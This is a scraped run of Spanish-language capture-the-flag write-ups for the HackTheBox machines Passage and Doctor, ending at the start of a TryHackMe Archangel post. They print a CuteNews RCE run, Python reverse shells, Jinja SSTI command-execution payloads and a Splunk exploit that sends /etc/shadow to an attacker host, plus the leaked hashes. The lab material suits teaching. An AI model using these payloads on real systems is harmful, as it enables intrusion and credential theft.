((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 25 01:34:55 2020 -- 1 IP address (1 host up) scanned in 10.77 seconds HTTP Encontramos una pagina web en el puerto 80.\nAl intentar realizar una busqueda directorios y paginas con gobuster parecia que la maquina habia caido, pero segun un post de la pagina tienen implementado fail2ban, por lo que al utilizar herramientas como gobuster o hydra, fail2ban banea nuestra IP por algun tiempo.\nCUTE NEWS - RCE Explorando la pagina encontramos en el footer de esta el nombre de lo que parece ser un CMS, al investigar un poco acerca de este nombre encontramos un exploit CuteNews 2.1.2 - Remote Code Execution.\nSegun el codigo del exploit realiza una consulta a /CuteNews/cdata/users/lines donde se almacenan en base64 las credenciales de usuarios, verificamos que esta direccion exista en esta version de CMS y vemos la lista de usuarios codificados.\nEl exploit al tener las credenciales realiza un cambio del \u0026ldquo;avatar\u0026rdquo; del usuario encontrado con una webshell dentro lo que permite ejecutar comandos en la maquina. Para ello descargamos y ejecutamos el exploit, logrando ejecutar comandos como usuario www-data y ver algunos hashes de los usuarios registrados en el CMS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 kali@kali:~/htb/passage$ python3 CuteNews-2.1.2-RCE.py _____ __ _ __ ___ ___ ___ / ___/_ __/ /____ / |/ /__ _ _____ |_ | \u0026lt; / |_ | / /__/ // / __/ -_) / -_) |/|/ (_-\u0026lt; / __/_ / / / __/ \\___/\\_,_/\\__/\\__/_/|_/\\__/|__,__/___/ /____(_)_(_)____/ ___ _________ / _ \\/ ___/ __/ / , _/ /__/ _/ /_/|_|\\___/___/ [-\u0026gt;] Usage python3 expoit.py Enter the URL\u0026gt; http://10.10.10.206 ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ================================================================ ============================= Registering a users ============================= [+] Registration successful with username: 8g9Nqx6ATg and password: 8g9Nqx6ATg ======================================================= Sending Payload ======================================================= signature_key: 2e4f7658cee281341e4f5f36f776847b-8g9Nqx6ATg signature_dsi: 2c0343d390fbd41777bd7c348ba74773 logged in user: 8g9Nqx6ATg ============================ Dropping to a SHELL ============================ command \u0026gt; whoami www-data command \u0026gt; Para tener una shell más comoda ejecutamos una shell inversa con python:\n1 python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.30\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; PAUL - USER Una vez dentro con una shell más comoda realizamos una enumeracion en la maquina pero no encontramos nada más que solo los usuarios de la maquina: paul y nadav, pero recordemos, encontramos algunos hashes (SHA256), utilizamos John y rockyou.txt para obtener algunas contraseñas.\n1 2 3 4 5 6 #HASHES 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc O de la manera facil utilizando CrackStation.\nUna vez con las contraseñas intentamos cambiar de usuario con estas, logramos obtener una shell con el usuario Paul y nuestra flag user.txt.\nNADAV - USER Realizamos una enumeracion con este usuario y esta vez encontramos en el archivo authorized_keys la clave publica (id_rsa.pub) de nadav, por lo que este usuario puede conectarse desde su cuenta a la nuestra (paul), si ese es el caso quizas nosotros tambien a la suya.\n1 2 3 4 paul@passage:~/.ssh$ cat auth* cat auth* ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage paul@passage:~/.ssh$ Nos conectamos mediante SSH en localhost con este usuario para comprobar que nuestro usuario (paul) tambien tenga acceso al usuario nadav. Lo cual pudimos confirmar y ahora tenemos una shell con nadav.\nPRIVILEGE ESCALATION Realizamos una enumeracion en la carpeta de nadav y encontramos algo interesante en el archivo .viminfo y es que uno de los archivos que fue editado con vim es /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf. Investigamos un poco acerca de este archivo y encontramos que es posible crear archivos como usuario root utilizando USBCreator D-Bus interface lo que podria ayudarnos a escalar privilegios. Para ello verificamos que usb-creator-helper este siendo ejecutado con el usuario root.\n1 2 3 4 5 nadav@passage:~$ ps -ef |grep usb-creator ps -ef |grep usb-creator root 1992 1 0 01:04 ? 00:00:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper nadav 2825 2741 0 01:43 pts/20 00:00:00 grep --color=auto usb-creator nadav@passage:~$ Ahora vamos a crear un archivo en la direccion / con un archivo temporal en /tmp/test.txt y vemos que el archivo se creo en /test.txt.\n1 2 3 4 5 6 7 8 9 nadav@passage:~$ echo -n \u0026#34;USBCreator D-Bus interface\u0026#34; \u0026gt; /tmp/test.txt echo -n \u0026#34;USBCreator D-Bus interface\u0026#34; \u0026gt; /tmp/test.txt nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt true \u0026lt;method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt true () nadav@passage:~$ ls -lah /test.txt ls -lah /test.txt -rw-r--r-- 1 root root 26 Sep 25 01:47 /test.txt nadav@passage:~$ Para obtener una shell con usuario root vamos a crear el archivo authorized_keys en la carpeta /root/.ssh/ y asi vamos a poder acceder a este usuario mediante SSH de la misma forma que con nadav. Primero vamos a copiar el archivo id_rsa.pub del usuario actual a /tmp/authorized_keys, luego creamos el archivo:\n1 gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/authorized_keys /root/.ssh/authorized_keys true Nos conectamos por medio de SSH y logramos obtener una shell y nuestra flag root.txt.\n","description":"Passage es una maquina de HackTheBox descubrimos CuteNews en donde encontramos credenciales codificadas en base64-MD5, además ejecutamos una shell inversa para tener acceso. Crackeamos los hashes encontrados para acceder al siguiente usuario. Encontramos la clave publica ya registrada en authorized_keys lo que nos dio acceso a otro usuario. Tras enumerar los archivos y procesos encontramos USBCreator D-Bus Interface que además descubrimos que puede crear archivos como root lo que aprovechamos para registrar nuestra clave publica en los archivos SSH de root para obtener privilegios como root.","id":73,"section":"posts","tags":["cute news cms","usbcreator d bus","rce"],"title":"Hack The Box - Passage","uri":"https://sckull.github.io/posts/passage/"},{"content":"\rDoctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso. Los Logs de Apache nos permitieron leer la contraseña del siguiente usuario. Explotamos una vulnerabilidad en Splunk lo que nos permitio obtener acceso privilegiado.\nInformacion de la Maquina Nombre Doctor OS Linux Puntos 20 Dificultad Facil IP 10.10.10.209 Maker egotisticalSW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.4, 5.9, 5.8, 4.2, 4.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 8, 7, 3, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssl-https(?) (8089) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # Nmap 7.80 scan initiated Wed Dec 30 18:17:55 2020 as: nmap -p- --min-rate 1000 -o scanPorts doctor.htb Nmap scan report for doctor.htb (10.10.10.209) Host is up (0.15s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8089/tcp open unknown # Nmap done at Wed Dec 30 18:20:06 2020 -- 1 IP address (1 host up) scanned in 131.59 seconds # Nmap 7.80 scan initiated Wed Dec 30 18:20:46 2020 as: nmap -sV -sC -p22,80,8089 -o servicePorts doctor.htb Nmap scan report for doctor.htb (10.10.10.209) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 30 18:21:28 2020 -- 1 IP address (1 host up) scanned in 42.04 seconds HTTP - PUERTO 80 Encontramos una pagina web en el puerto 80, en esta pagina vemos tambien un dominio doctors.htb el cual agregamos junto al que ya teniamos.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero al parecer es una pagina estatica.\n1 2 3 4 5 6 7 8 9 10 11 12 13 kali@kali:~/htb/doctor$ gobuster dir -u http://doctor.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25 /about.html (Status: 200) /blog.html (Status: 200) /contact.html (Status: 200) /css (Status: 301) /departments.html (Status: 200) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /services.html (Status: 200) HTTPS - PUERTO 8089 En este puerto encontramos una \u0026ldquo;pagina\u0026rdquo; donde vemos Splunk en su version web: Splunk build 8.0.5. Tambien un post donde describe una vulnerabilidad en este \u0026ldquo;servicio\u0026rdquo; que permite ejecutar comandos, utilizamos el exploit remoto con las credenciales por default pero no logramos obtener ninguna respuesta, por lo que es necesario obtener credenciales.\nDOCTORS Con el dominio nuevo, encontramos un login, donde registramos un usuario y en la pagina inicial vemos una opcion de escribir mensajes que solo presentan contenido y titulo en la pagina principal.\nUtilizando BurpSuite dentro de las respuestas pudimos encontrar que es una aplicacion escrita en Python, además ejecutamos Gobuster para buscar diferentes rutas dentro de la aplicacion. Vemos /archive una direccion que no aparece relacionada en ninguna opcion del menu de la aplicacion.\n1 2 3 4 5 6 7 8 9 kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ gobuster dir -u http://doctors.htb/ -w /usr/share/wordlists/dirb/big.txt -q -x php,html,txt -t 35 -k /account (Status: 302) /archive (Status: 200) /home (Status: 302) /login (Status: 200) /logout (Status: 302) /register (Status: 200) /reset_password (Status: 200) /server-status (Status: 403) La ultima direccion mencionada no tiene ningun tipo de contenido pero al verificar el codigo fuente vemos XML donde se ve reflejado el titulo del Mensaje que creamos, por lo que quizá sea vulnerable a XXE Injection en la etiqueta \u0026lt;title\u0026gt;PAYLOAD\u0026lt;/title\u0026gt;.\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;Archive\u0026lt;/title\u0026gt; \u0026lt;item\u0026gt;\u0026lt;title\u0026gt;Doctor\u0026lt;/title\u0026gt;\u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt;\tIntentamos con XXE con diferentes \u0026ldquo;payloads\u0026rdquo; en el titulo pero no retornaba ningun valor. Luego de explorar algunas vulnerabilidades \u0026ldquo;parecidas\u0026rdquo; encontramos Server Side Template Injection - Jinja en Python, utilizando los diferentes Payloads iniciales, vemos valores retornados.\n1 {{4*4}}[[5*5]] Tambien logramos obtener un poco de informacion como la direccion de la base de datos, la direccion de la aplicacion, su codigo fuente y el contenido de la base de datos, ejecutando algunos comandos con un payload para ejecucion de estos.\nbash\rxml\rbash\rpython\r#configuracion\r{{config.items()}}\r#Ejecucion de comandos\r{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} 1 2 3 4 5 6 7 8 \u0026lt;!-- Direccion /archive --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;Archive\u0026lt;/title\u0026gt; \u0026lt;item\u0026gt;\u0026lt;title\u0026gt;dict_items([(\u0026#39;ENV\u0026#39;, \u0026#39;production\u0026#39;), (\u0026#39;DEBUG\u0026#39;, False), (\u0026#39;TESTING\u0026#39;, False), (\u0026#39;PROPAGATE_EXCEPTIONS\u0026#39;, None), (\u0026#39;PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;, None), (\u0026#39;SECRET_KEY\u0026#39;, \u0026#39;1234\u0026#39;), (\u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;, datetime.timedelta(days=31)), (\u0026#39;USE_X_SENDFILE\u0026#39;, False), (\u0026#39;SERVER_NAME\u0026#39;, None), (\u0026#39;APPLICATION_ROOT\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;SESSION_COOKIE_NAME\u0026#39;, \u0026#39;session\u0026#39;), (\u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;, False), (\u0026#39;SESSION_COOKIE_PATH\u0026#39;, None), (\u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;, True), (\u0026#39;SESSION_COOKIE_SECURE\u0026#39;, False), (\u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;, None), (\u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;, True), (\u0026#39;MAX_CONTENT_LENGTH\u0026#39;, None), (\u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;, datetime.timedelta(seconds=43200)), (\u0026#39;TRAP_BAD_REQUEST_ERRORS\u0026#39;, None), (\u0026#39;TRAP_HTTP_EXCEPTIONS\u0026#39;, False), (\u0026#39;EXPLAIN_TEMPLATE_LOADING\u0026#39;, False), (\u0026#39;PREFERRED_URL_SCHEME\u0026#39;, \u0026#39;http\u0026#39;), (\u0026#39;JSON_AS_ASCII\u0026#39;, True), (\u0026#39;JSON_SORT_KEYS\u0026#39;, True), (\u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;, False), (\u0026#39;JSONIFY_MIMETYPE\u0026#39;, \u0026#39;application/json\u0026#39;), (\u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;, None), (\u0026#39;MAX_COOKIE_SIZE\u0026#39;, 4093), (\u0026#39;MAIL_PASSWORD\u0026#39;, \u0026#39;doctor\u0026#39;), (\u0026#39;MAIL_PORT\u0026#39;, 587), (\u0026#39;MAIL_SERVER\u0026#39;, \u0026#39;\u0026#39;), (\u0026#39;MAIL_USERNAME\u0026#39;, \u0026#39;doctor\u0026#39;), (\u0026#39;MAIL_USE_TLS\u0026#39;, True), (\u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;, \u0026#39;sqlite://///home/web/blog/flaskblog/site.db\u0026#39;), (\u0026#39;WTF_CSRF_CHECK_DEFAULT\u0026#39;, False), (\u0026#39;SQLALCHEMY_BINDS\u0026#39;, None), (\u0026#39;SQLALCHEMY_NATIVE_UNICODE\u0026#39;, None), (\u0026#39;SQLALCHEMY_ECHO\u0026#39;, False), (\u0026#39;SQLALCHEMY_RECORD_QUERIES\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_SIZE\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_TIMEOUT\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_RECYCLE\u0026#39;, None), (\u0026#39;SQLALCHEMY_MAX_OVERFLOW\u0026#39;, None), (\u0026#39;SQLALCHEMY_COMMIT_ON_TEARDOWN\u0026#39;, False), (\u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;, None), (\u0026#39;SQLALCHEMY_ENGINE_OPTIONS\u0026#39;, {})])\u0026lt;/title\u0026gt;\u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; 1 2 #!/bin/bash SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py 1 2 3 4 5 6 from flaskblog import create_app app = create_app() if __name__ == __main__: app.run(debug=False) En la base de datos encontramos el Post donde vemos el contenido de nuestro payload para realizar la lectura del archivo de base de datos, tambien vemos nuestro usuario con la informacion de registro y autenticacion, tambien el usuario admin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/htb/doctor$ sqlite3 site.db SQLite version 3.33.0 2020-08-14 13:23:32 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .databases main: /home/kali/htb/doctor/site.db sqlite\u0026gt; .tables post user sqlite\u0026gt; select * from post; 1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1 2|{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /home/web/blog/flaskblog/site.db|base64\u0026#39;).read()}}|2020-12-31 01:44:15.772119|doctor |2 sqlite\u0026gt; select * from user; 1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S 2|doctor|doctor@d.com|default.gif|$2b$12$GKxenfwkogZHS97jty2qkODlTrlQeP90HN9VdN0LHTKwiGB8ANcPi sqlite\u0026gt; WEB - USER Ejecutamos una shell inversa con la cual logramos obtener una shell con el usuario web.\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026#34;warning\u0026#34; in x.__name__ %}{{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.14.224\\\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/bash\\\u0026#34;]);\u0026#39;\u0026#34;).read().zfill(417)}}{%endif%}{% endfor %} Realizamos una enumeracion en la maquina, encontramos algunos archivos del usuario root los cuales seguramente se ejecutan cada cierto tiempo para restaurar los archivos de la aplicacion web.\n1 2 3 4 5 6 7 8 9 web@doctor:/opt/clean$ ls -lah ls -lah total 52K drwxrwxr-x 2 root root 4,0K Sep 7 15:36 . drwxr-xr-x 4 root root 4,0K Sep 6 17:56 .. -rwxr-xr-x 1 root root 211 Sep 6 16:14 cleandb.py -rwxr-xr-x 1 root root 129 Jul 26 19:35 clean.py -rw-r--r-- 1 root root 36K Sep 6 16:12 site.db web@doctor:/opt/clean$ SHAUN - USER Realizamos una enumeracion y encontramos una contraseña en los logs de apache.\nweb@doctor:/var/log/apache2$ grep password * |grep -v gobuster\rgrep password * |grep -v gobuster\rbackup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \u0026#34;POST /reset_password?email=Guitar123\u0026#34; 500 453 \u0026#34;http://doctor.htb/reset_password\u0026#34;\rweb@doctor:/var/log/apache2$ Utilizamos la contraseña encontrada con el usuario shaun, logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Anteriormente encontramos en el puerto 8089 a splunk pero necesitabamos credenciales para poder ejecutar comandos o realizar lectura de archivos, con las credenciales de Shaun ejecutamos el exploit remoto lo que permitio realizar la lectura del archivo /etc/shadow.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ python3 PySplunkWhisperer2_remote.py --host doctor.htb --port 8089 --username shaun --password \u0026#34;Guitar123\u0026#34; --payload \u0026#34;curl -F \u0026#39;data=@/etc/shadow\u0026#39; http://10.10.14.224:8081\u0026#34; --lhost 10.10.14.224 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpwp69gine.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.224:8181/ 10.10.10.209 - - [30/Dec/2020 22:23:59] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - [+] App installed, your code should be running now! Press RETURN to cleanup 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 kali@kali:~/htb/doctor$ nc -lvvvp 8081 listening on [any] 8081 ... connect to [10.10.14.224] from doctor.htb [10.10.10.209] 44140 POST / HTTP/1.1 Host: 10.10.14.224:8081 User-Agent: curl/7.68.0 Accept: */* Content-Length: 1976 Content-Type: multipart/form-data; boundary=------------------------56671751738f1529 Expect: 100-continue --------------------------56671751738f1529 Content-Disposition: form-data; name=\u0026#34;data\u0026#34;; filename=\u0026#34;shadow\u0026#34; Content-Type: application/octet-stream root:$6$384TbSO3bB1PWLT1$U8U.j.zBLXobhorPDxOMRZh4eE86lcn7C0dvqRvfJ9qDzreti8HDvXwFZccDat9/HJRNwu04ErVxo3mUwVbs5.:18512:0:99999:7::: daemon:*:18375:0:99999:7::: bin:*:18375:0:99999:7::: sys:*:18375:0:99999:7::: sync:*:18375:0:99999:7::: games:*:18375:0:99999:7::: man:*:18375:0:99999:7::: lp:*:18375:0:99999:7::: mail:*:18375:0:99999:7::: news:*:18375:0:99999:7::: uucp:*:18375:0:99999:7::: proxy:*:18375:0:99999:7::: www-data:*:18375:0:99999:7::: backup:*:18375:0:99999:7::: list:*:18375:0:99999:7::: irc:*:18375:0:99999:7::: gnats:*:18375:0:99999:7::: nobody:*:18375:0:99999:7::: systemd-network:*:18375:0:99999:7::: systemd-resolve:*:18375:0:99999:7::: systemd-timesync:*:18375:0:99999:7::: messagebus:*:18375:0:99999:7::: syslog:*:18375:0:99999:7::: _apt:*:18375:0:99999:7::: tss:*:18375:0:99999:7::: uuidd:*:18375:0:99999:7::: tcpdump:*:18375:0:99999:7::: avahi-autoipd:*:18375:0:99999:7::: usbmux:*:18375:0:99999:7::: rtkit:*:18375:0:99999:7::: dnsmasq:*:18375:0:99999:7::: cups-pk-helper:*:18375:0:99999:7::: speech-dispatcher:!:18375:0:99999:7::: avahi:*:18375:0:99999:7::: kernoops:*:18375:0:99999:7::: saned:*:18375:0:99999:7::: nm-openvpn:*:18375:0:99999:7::: hplip:*:18375:0:99999:7::: whoopsie:*:18375:0:99999:7::: colord:*:18375:0:99999:7::: geoclue:*:18375:0:99999:7::: pulse:*:18375:0:99999:7::: gnome-initial-setup:*:18375:0:99999:7::: systemd-coredump:!!:18463:::::: web:$6$luVwBTOn1q154RLG$KKPgd66FyKM6z.hCPPvOYEVNoZgj/sAagvMrzWSoKrnWICgHo8oRGPzt5glRc7lm6lDfbwk3OUCIfBkYeeCHG0:18463:0:99999:7::: _rpc:*:18464:0:99999:7::: statd:*:18464:0:99999:7::: exim:!:18469:0:99999:7::: sshd:*:18469:0:99999:7::: shaun:$6$xEyi3OGI4XZfW7uM$dPxAIWOZuAFwJj4W69VGT.T1YLlnEvvaphLjswVs4hv5RUtJ7v7F37XfPtwst9Ije3imy4gRcRppsAZLQ81z80:18519:0:99999:7::: splunk:!:18511:0:99999:7::: --------------------------56671751738f1529-- Ejecutamos una shell inversa con lo que logramos obtener shell con usuario root y la flag root.txt.\n","description":"Doctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso. Los Logs de Apache nos permitieron leer la contraseña del siguiente usuario. Explotamos una vulnerabilidad en Splunk lo que nos permitio obtener acceso privilegiado.","id":74,"section":"posts","tags":["splunkd","python","ssti","injection"],"title":"Hack The Box - Doctor","uri":"https://sckull.github.io/posts/doctor/"},{"content":"\rArchangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.\nRoom Titulo Archangel Descripción Boot2root, Web exploitation, Privilege escalation, LFI Puntos 210 Dificultad Facil Maker Archangel NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Thu Feb 4 19:10:33 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan archangel.thm Warning: 10.10.84.37 giving up on port because retransmission cap hit (6). Nmap scan report for archangel.thm (10.10.84.37) Host is up (0.31s latency). Not shown: 64873 closed ports, 660 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Thu Feb 4 19:12:40 2021 -- 1 IP address (1 host up) scanned in 126.26 seconds # Nmap 7.80 scan initiated Thu Feb 4 19:13:30 2021 as: nmap -p22,80 -sV -sC -oN serviceScan -Pn archangel.thm Nmap scan report for archangel.thm (10.10.84.37) Host is up (0.34s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA) | 256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA) |_ 256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Wavefire Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 4 19:14:04 2021 -- 1 IP address (1 host up) scanned in 34.20 seconds HTTP Encontramos una pagina web en el puerto 80 y nuevo dominio.\nEn el dominio encontrado vemos nuestra primera flag.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos en el dominio encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ 